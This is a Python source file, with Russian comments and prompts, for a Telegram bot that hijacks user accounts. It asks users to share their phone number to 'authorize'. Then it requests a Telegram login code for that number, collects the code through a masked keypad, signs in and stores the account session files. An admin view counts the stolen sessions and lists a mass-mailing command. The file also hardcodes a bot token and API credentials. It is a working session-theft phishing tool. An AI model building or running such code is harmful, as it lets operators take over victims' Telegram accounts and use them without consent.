import os
import asyncio
import logging
from datetime import datetime

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    Contact,
    ReplyKeyboardMarkup,
    KeyboardButton,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
)

# ────────────────────────────────────────────────
# НАСТРОЙКИ + ЛОГГИНГ
# ────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding="utf-8")
    ]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc'
API_ID = 31462757
API_HASH = '79ae4e151e84526e11b107e99ad67177'
ADMIN_IDS = {8559221549}

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)


# ────────────────────────────────────────────────
# СОСТОЯНИЯ
# ────────────────────────────────────────────────
class AddSession(StatesGroup):
    waiting_phone = State()
    waiting_code = State()


# ────────────────────────────────────────────────
# КЛАВИАТУРЫ
# ────────────────────────────────────────────────
def get_continue_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True,
        keyboard=[[KeyboardButton(text="Продолжить", request_contact=True)]]
    )


def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton(text="1", callback_data="code:1"),
            InlineKeyboardButton(text="2", callback_data="code:2"),
            InlineKeyboardButton(text="3", callback_data="code:3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="code:4"),
            InlineKeyboardButton(text="5", callback_data="code:5"),
            InlineKeyboardButton(text="6", callback_data="code:6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="code:7"),
            InlineKeyboardButton(text="8", callback_data="code:8"),
            InlineKeyboardButton(text="9", callback_data="code:9"),
        ],
        [
            InlineKeyboardButton(text="0", callback_data="code:0"),
            InlineKeyboardButton(text="← стереть", callback_data="code:back"),
            InlineKeyboardButton(text="Отмена", callback_data="code:cancel"),
        ],
        [
            InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm"),
        ],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def mask_code(code: str) -> str:
    if not code:
        return "•••••"
    return "•" * (len(code) - 1) + code[-1] if code else "•••••"


# ────────────────────────────────────────────────
# /start
# ────────────────────────────────────────────────
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    if message.from_user.id in ADMIN_IDS:
        count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
        await message.answer(
            f"Привет, админ!\nСейчас сессий: <b>{count}</b>\n\n"
            "<code>/send</code> — рассылка\n<code>/count</code> — количество"
        )
        return

    await message.answer(
        "Нажми «Продолжить», чтобы поделиться номером и авторизоваться.",
        reply_markup=get_continue_keyboard()
    )
    await state.set_state(AddSession.waiting_phone)


# ────────────────────────────────────────────────
# Получение номера → запрос кода
# ────────────────────────────────────────────────
@router.message(F.contact, StateFilter(AddSession.waiting_phone))
async def process_phone(message: Message, state: FSMContext):
    contact = message.contact
    if not contact:
        await message.reply("Поделись номером через кнопку.")
        return

    phone = contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")
    if not phone.isdigit() or len(phone) < 9:
        await message.reply("Некорректный номер.")
        await state.clear()
        return

    session_path = os.path.join(SESSIONS_DIR, f"{phone}.session")

    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        if await client.is_user_authorized():
            await message.reply("Этот номер уже авторизован здесь.")
            await state.clear()
            return

        logger.info(f"Запрос кода для {phone}")
        sent_code = await client.send_code_request(phone)

        msg = await message.reply(
            f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:",
            reply_markup=get_code_keyboard()
        )

        await state.update_data(
            phone=phone,
            session_path=session_path,
            client=client,  # сохраняем клиента!
            current_code="",
            code_message_id=msg.message_id,
            code_request_time=datetime.utcnow().timestamp()
        )

        await state.set_state(AddSession.waiting_code)

    except FloodWaitError as e:
        await message.reply(f"Слишком много попыток. Подожди {e.seconds // 60 + 1} мин.")
        await state.clear()
    except Exception as e:
        logger.exception(f"Ошибка при запросе кода {phone}")
        await message.reply(f"Ошибка: {str(e)[:200]}")
        await state.clear()
    # НЕ disconnect здесь — оставляем клиента живым


# ────────────────────────────────────────────────
# Обработка кнопок кода
# ────────────────────────────────────────────────
@router.callback_query(StateFilter(AddSession.waiting_code))
async def process_code_button(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    current_code = data.get("current_code", "")
    code_msg_id = data.get("code_message_id")
    client = data.get("client")
    phone = data.get("phone")
    session_path = data.get("session_path")

    action = callback.data.split(":", 1)[1] if ":" in callback.data else ""

    if action.isdigit() and len(current_code) < 5:
        current_code += action
        await state.update_data(current_code=current_code)

    elif action == "back" and current_code:
        current_code = current_code[:-1]
        await state.update_data(current_code=current_code)

    elif action == "cancel":
        if client:
            await client.disconnect()
        await state.clear()
        await callback.message.edit_text("Авторизация отменена.")
        await callback.answer("Отменено")
        return

    elif action == "confirm":
        if len(current_code) != 5:
            await callback.answer("Нужно ровно 5 цифр", show_alert=True)
            return

        if not client or not await client.is_connected():
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()

        try:
            logger.info(f"Попытка sign_in для {phone} с кодом {current_code}")
            await client.sign_in(phone=phone, code=current_code)  # без hash — используем тот же клиент!

            # Проверяем успех
            if await client.is_user_authorized():
                me = await client.get_me()
                logger.info(f"УСПЕШНЫЙ ВХОД → {me.first_name} (@{me.username or 'нет'}) id={me.id}")
                session_size = os.path.getsize(session_path) if os.path.exists(session_path) else 0
                logger.info(f"Сессия сохранена, размер: {session_size} байт")

                await callback.message.edit_text(
                    f"Готово! Аккаунт <code>+{phone}</code> авторизован.\n"
                    "Сессия сохранена. Можешь удалить это сообщение."
                )
            else:
                logger.warning(f"sign_in прошёл, но is_user_authorized = False для {phone}")
                await callback.message.edit_text("Не удалось авторизоваться. Попробуй заново /start")

            await state.clear()

        except PhoneCodeInvalidError:
            logger.warning(f"Неверный код для {phone}")
            await callback.answer("Неверный код", show_alert=True)
            await state.update_data(current_code="")
            if code_msg_id:
                await bot.edit_message_text(
                    chat_id=callback.message.chat.id,
                    message_id=code_msg_id,
                    text=f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код (неверный):",
                    reply_markup=get_code_keyboard("")
                )

        except PhoneCodeExpiredError:
            await callback.message.edit_text("Код устарел. Нажми /start заново.")
            await state.clear()

        except SessionPasswordNeededError:
            await callback.message.edit_text("На аккаунте включена двухфакторная аутентификация.\nПоддержка 2FA пока не реализована.")
            await state.clear()

        except FloodWaitError as e:
            await callback.message.edit_text(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
            await state.clear()

        except Exception as e:
            logger.exception(f"Критическая ошибка sign_in {phone}")
            await callback.message.edit_text(f"Ошибка авторизации: {str(e)[:180]}")
            await state.clear()

        finally:
            if client and await client.is_connected():
                await client.disconnect()
                logger.info(f"Клиент для {phone} отключён")

        await callback.answer()
        return

    # Обновляем сообщение с кодом
    display = mask_code(current_code)
    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display}</b>"

    if code_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=code_msg_id,
                text=text,
                reply_markup=get_code_keyboard(current_code)
            )
        except Exception as e:
            logger.debug(f"Не удалось обновить сообщение: {e}")

    await callback.answer()


# ────────────────────────────────────────────────
# Запуск (остальные команды можно добавить позже)
# ────────────────────────────────────────────────
async def main():
    logger.info("Бот запущен")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    asyncio.run(main())
